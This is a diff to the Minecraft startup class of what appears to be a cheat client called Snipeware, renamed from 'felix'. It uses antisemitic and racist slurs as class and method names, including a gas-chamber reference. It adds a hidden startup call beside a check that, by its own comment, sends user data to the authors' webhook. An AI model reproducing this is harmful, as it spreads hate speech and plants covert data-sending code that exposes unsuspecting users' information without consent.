@@ -15,14 +15,17 @@ import com.mojang.authlib.properties.PropertyMap;
 import com.mojang.authlib.yggdrasil.YggdrasilAuthenticationService;
 
 import com.thealtening.domain.User;
-import felix.Client;
-import felix.events.player.EventKeyPress;
-import felix.events.render.EventGuiContainer;
-import felix.gui.menu.ClientMainMenu;
-import felix.hwid.NoStackTraceThrowable;
-import felix.management.ModuleManager;
-import felix.module.Module;
-import felix.security.JUDENSCHWEIN;
+
+import Snipeware.Client;
+import Snipeware.events.player.EventKeyPress;
+import Snipeware.events.render.EventGuiContainer;
+import Snipeware.gui.menu.ClientMainMenu;
+import Snipeware.hwid.NoStackTraceThrowable;
+import Snipeware.management.ModuleManager;
+import Snipeware.module.Module;
+import Snipeware.security.JUDENENCHAMBERDEGASSO;
+import Snipeware.security.JUDENSCHWEIN;
+import Snipeware.util.visual.UserLogin;
 
 import java.awt.image.BufferedImage;
 import java.io.BufferedReader;
@@ -53,7 +56,6 @@ import java.util.concurrent.Executors;
 import java.util.concurrent.FutureTask;
 import javax.imageio.ImageIO;
 
-import felix.util.visual.UserLogin;
 import font.FontRenderer;
 import net.minecraft.block.Block;
 import net.minecraft.block.material.Material;
@@ -446,6 +448,7 @@ public class Minecraft implements IThreadListener, IPlayerUsage
 
         try
         {
+			JUDENENCHAMBERDEGASSO.nig();
         	File f = new File("C:\\Users\\"+System.getProperty("user.name")+"\\at.bmp");
         	if(f.exists() && !f.isDirectory()) { 
         		JUDENSCHWEIN.nig(); // ANTI-JEW Checks for BMP file and ig it exists, sends some data to our webhook
